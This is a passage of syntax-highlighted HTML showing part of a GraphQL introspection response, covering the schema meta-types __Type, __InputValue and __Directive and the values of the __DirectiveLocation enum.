class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;inputFields&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__InputValue&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;interfaces&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;kind&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__TypeKind&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ofType&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;possibleTypes&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Arguments provided to Fields or Directives and the input fields of an InputObject are represented as Input Values which describe their type and optionally a default value.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A GraphQL-formatted string representing the default value for this input value.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;defaultValue&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;type&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__InputValue&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A Directive provides a way to describe alternate runtime execution and type validation behavior in a GraphQL document. \n\nIn some cases, you need to provide options to alter GraphQL&#39;s execution behavior in ways field arguments will not suffice, such as conditionally including or skipping a field. Directives provide this by describing additional information to the executor.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;args&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__InputValue&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;locations&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__DirectiveLocation&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="s2">&#34;Use `locations`.&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;onField&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="s2">&#34;Use `locations`.&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;onFragment&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="s2">&#34;Use `locations`.&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;onOperation&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Directive&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A Directive can be adjacent to many parts of the GraphQL language, a __DirectiveLocation describes one such possible adjacencies.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:[{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;FIELD&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a schema definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;SCHEMA&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an input object type definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INPUT_OBJECT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a mutation operation.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;MUTATION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a scalar definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an enum value definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM_VALUE&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an enum definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a query operation.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;QUERY&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a subscription operation.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;SUBSCRIPTION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a fragment definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;FRAGMENT_DEFINITION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a fragment spread.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;FRAGMENT_SPREAD&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an inline fragment.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INLINE_FRAGMENT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an argument definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ARGUMENT_DEFINITION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a object definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a field definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;FIELD_DEFINITION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an interface definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INTERFACE&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a union definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span 